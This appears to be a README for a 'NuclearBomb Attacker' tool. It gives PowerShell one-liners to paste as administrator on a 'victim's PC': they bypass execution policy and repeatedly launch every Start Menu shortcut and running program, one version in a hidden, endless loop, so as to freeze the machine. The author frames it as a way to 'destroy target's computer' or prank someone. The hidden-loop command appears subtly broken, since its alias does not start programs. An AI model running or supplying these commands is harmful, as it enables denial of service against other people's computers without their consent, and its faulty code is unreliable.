# NuclearBomb Attacker

 NuclearBomb Attacker is a CMD command for attacking victim's Computer.
 It will open each files , applications , websites , portals in every seconds at the same time.
 Laptop/Pc starts to lag and you have 1000 of files , applications , websites execute on OS in only 30 - 40 seconds.
 
 ⚠️ Try at your own risk


# Medium level attack  Command

 RUN POWERSHELL AS ADMINSTRATOR ON VICTIM'S PC AND PASTE 
 
```bash
powershell -ExecutionPolicy Bypass -Command "Get-ChildItem 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs','C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs' -Recurse -Include *.lnk | ForEach { Start-Process $_.FullName -ErrorAction SilentlyContinue }; Get-Process | Where {$_.ProcessName -notin @('powershell','cmd','explorer')} | ForEach { Start-Process $_.MainModule.FileName -ErrorAction SilentlyContinue }"
```

## Nuclear - Attack command 

```python
powershell -w hidden -ep bypass -c "while(1){ gci 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs','$env:APPDATA\Microsoft\Windows\Start Menu\Programs' -r -fi *.lnk | % { sp $_.fullname -ea 0 }; slp 5 }"

```

## STOP WITH 
```bash
taskkill /f /im powershell.exe
wmic process where name="powershell.exe" delete
```



## Contributing

Pull requests are welcome. For major changes, please open an issue first
to discuss what you would like to change.

Please make sure to update tests as appropriate.

## DEVELOPER 

Commands by Vipin to destroy target's computer or to prank someone 



